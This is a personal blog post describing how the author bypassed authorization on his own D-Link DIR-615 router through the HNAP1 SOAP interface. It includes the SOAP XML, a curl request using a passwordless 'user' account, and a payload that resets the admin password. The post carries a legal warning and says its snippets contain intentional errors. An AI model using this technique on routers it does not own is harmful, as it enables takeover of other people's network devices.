<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="generator" content="pandoc">
    <meta name="viewport" content="width=device-width,
                                   initial-scale=1.0,
                                   user-scalable=yes">
    <meta name="author" content="Daniel Jour">
            <meta name="dcterms.date" content="2018-03-26">
                <title>Exploiting a HNAP1 security flaw on my D-Link DIR-615 router – musteresel's blog</title>
    <style type="text/css">code{white-space: pre;}</style>
        <style type="text/css">
      body {
      padding-left: 1em;
      padding-right: 1em;
      margin-left: auto;
      margin-right: auto;
      max-width: 42em;
      font-size: 100%;
      font-family: Verdana, Geneva, sans-serif;
      line-height: 24px;
      }
      div.sourceCode {
      line-height: normal;
      }
      .heading {
      color: #002560;
      }
      a:link, a:visited {
      color: #008aa3;
      text-decoration: none;
      }
      a:hover {
      color: #004d60;
      text-decoration: none;
      }
      a:active {
      color: white;
      background-color: #008aa3;
      }
      footer {
      font-size: 75%;
      }
      .not-my-info {
      font-size: 0;
      }
      pre > code {
      overflow-x: auto;
      display: block;
      }
    </style>
        <style type="text/css">
      div.sourceCode { overflow-x: auto; }
      table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
        margin: 0; padding: 0; vertical-align: baseline; border: none; }
      table.sourceCode { width: 100%; line-height: 100%; }
      td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
      td.sourceCode { padding-left: 5px; }
      code > span.kw { color: #007020; font-weight: bold; } /* Keyword */
      code > span.dt { color: #902000; } /* DataType */
      code > span.dv { color: #40a070; } /* DecVal */
      code > span.bn { color: #40a070; } /* BaseN */
      code > span.fl { color: #40a070; } /* Float */
      code > span.ch { color: #4070a0; } /* Char */
      code > span.st { color: #4070a0; } /* String */
      code > span.co { color: #60a0b0; font-style: italic; } /* Comment */
      code > span.ot { color: #007020; } /* Other */
      code > span.al { color: #ff0000; font-weight: bold; } /* Alert */
      code > span.fu { color: #06287e; } /* Function */
      code > span.er { color: #ff0000; font-weight: bold; } /* Error */
      code > span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
      code > span.cn { color: #880000; } /* Constant */
      code > span.sc { color: #4070a0; } /* SpecialChar */
      code > span.vs { color: #4070a0; } /* VerbatimString */
      code > span.ss { color: #bb6688; } /* SpecialString */
      code > span.im { } /* Import */
      code > span.va { color: #19177c; } /* Variable */
      code > span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
      code > span.op { color: #666666; } /* Operator */
      code > span.bu { } /* BuiltIn */
      code > span.ex { } /* Extension */
      code > span.pp { color: #bc7a00; } /* Preprocessor */
      code > span.at { color: #7d9029; } /* Attribute */
      code > span.do { color: #ba2121; font-style: italic; } /* Documentation */
      code > span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
      code > span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
      code > span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    </style>
            <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <header>
      <h1 class="heading"><a href="../../../index.html">musteresel's blog</a></h1>
    </header>
    <hr>
    <article>
            <header>
        <h1 class="title">Exploiting a HNAP1 security flaw on my D-Link DIR-615 router</h1>
                                <p class="date">2018-03-26</p>
                        <p class="tags">tagged:
                    <a href="../../../posts/tagged/security/index.html">security</a>,
                    <a href="../../../posts/tagged/network/index.html">network</a></p>
              </header>
            <p>Because some wifi devices had connection issues with my &quot;normal&quot; router (with an integrated wifi access point) I decided to integrate an old D-Link DIR-615 router (with ap) I had still lying around into my wifi network and see whether the connection quality would improve.</p>
<p>Unfortunately I couldn't remember the admin password I set when that router was still in use. That was kind of a déjà vu because I faced the same issue once when the router was still in use, too. Back then I couldn't access the reset button due to the device being fixed to the wall. And pressing the reset button is boring either way, no?</p>
<p><em>Attention: IANAL, but doing the following with a device that you do not own or don't have explicit (written) consent of the owner to perform these steps is illegal in probably all parts of the world. Moreover it's probably possible to &quot;brick&quot; - permanently damage - your device.</em></p>
<p>The <a href="https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol">&quot;Home Network Administration Protocol&quot;</a> allows querying and setting of configuration options on network devices (such as routers). It's based on SOAP which effectively means that you're sending HTTP POST messages with a special header and some XML.</p>
<p>For HNAP1 the special header is a:</p>
<pre><code>SOAPAction: &quot;http://purenetworks.com/HNAP1/GetDeviceSettings&quot;</code></pre>
<p>where the <code>GetDeviceSettings</code> part specifies what action you want to perform on the accessed device.</p>
<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="kw">&lt;?xml</span> version=&quot;1.0&quot; encoding=&quot;utf-8&quot;<span class="kw">?&gt;</span>
<span class="kw">&lt;soap:Envelope</span>
<span class="ot">    xmlns:xsi=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
<span class="ot">    xmlns:xsd=</span><span class="st">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>
<span class="ot">    xmlns:soap=</span><span class="st">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>
<span class="ot">    soap:encodingStyle=</span><span class="st">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><span class="kw">&gt;</span>
  <span class="kw">&lt;soap:Body&gt;</span>
    <span class="kw">&lt;GetDeviseSettings</span><span class="ot"> xmlns=</span><span class="st">&quot;http://purenetworks.com/HNAP1/&quot;</span><span class="kw">&gt;</span>
    <span class="kw">&lt;/GetDeviseSettings&gt;</span>
  <span class="kw">&lt;/soap:Body&gt;</span>
  <span class="co">&lt;!-- Header: --&gt;</span>
  <span class="co">&lt;!-- SOAPAction: &quot;http://purenetworks.com/HNAP1/GetDeviceSettings&quot; --&gt;</span>
<span class="kw">&lt;/soap:Envelope&gt;</span></code></pre></div>
<p>Sending the above with</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">curl</span> -X POST \
  --header <span class="st">&quot;SOAPAction: </span><span class="dt">\&quot;</span><span class="st">http://purenetworks.com/HNAP1/GetDeviceSettings</span><span class="dt">\&quot;</span><span class="st">&quot;</span> \
  --header <span class="st">&quot;Authorization Basic dXNlcjo=&quot;</span> \
  --data @above_xml_in_a_file.xml</code></pre></div>
<p>returns some XML with device information as well as supported SOAP actions on my DIR-615.</p>
<p>What's that <code>Authorization</code> header? That's just <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">basic HTTP authentication</a> for a <code>user</code> account and an empty password:</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> -n <span class="st">&quot;user:&quot;</span> <span class="kw">|</span> <span class="ex">base64</span>
<span class="co"># dXNlcjo=</span></code></pre></div>
<p>Now, on some other D-Link routers one can apparently fool the HNAP implementation by providing a <code>SOAPAction</code> header that doesn't require authentication (like <code>GetDeviceSettings</code>) but specify an action (which will then get executed by the device) in the XML that would've required authentication (like <code>SetDeviceSettings</code> for changing the admin password) - and thus bypass any authentication or authorization.</p>
<p>That's not the case for my DIR-615: it <em>always</em> requires authentication. Moreover, it also <em>always</em> executes the action specified in the <code>SOAPAction</code> header. <em>But</em> it doesn't check whether the authenticated client is <strong>authorized</strong> to execute that action. Put simply: That <code>user</code> account with no password can do everything the admin can do.</p>
<p>So, to change the admin password all that needed was sending</p>
<div class="sourceCode"><pre class="sourceCode xml"><code class="sourceCode xml"><span class="co">&lt;!-- ... --&gt;</span>
<span class="kw">&lt;SetDeviseSettings</span><span class="ot"> xmlns=</span><span class="st">&quot;http://purenetworks.com/HNAP1/&quot;</span><span class="kw">&gt;</span>
    <span class="kw">&lt;AdminPassword&gt;</span>password<span class="kw">&lt;/AdminPassword&gt;</span>
<span class="kw">&lt;/SetDeviseSettings&gt;</span>
<span class="co">&lt;!-- ... --&gt;</span></code></pre></div>
<p><em>Note: Errors in the code snippets shown on this page are intentional. Don't copy and paste; think about what you want to do and whether it's okay to do.</em></p>
            <hr>
      <footer>
        <a href="https://docs.google.com/forms/d/e/1FAIpQLSfV7TfT4OIcpopar3hBoLnzHBmbOi85ysjX23cQsvKzBCy4Dw/viewform?usp=pp_url&entry.1949939362=posts/2018/03/exploit-hnap-security-flaw-dlink-dir-615.html">
          Send me a message regarding this post</a>
      </footer>
      
    </article>
    <hr>
    <footer>
      <a href="../../../legal.html">Legal Notice / Impressum</a>
    </footer>
  </body>
</html>
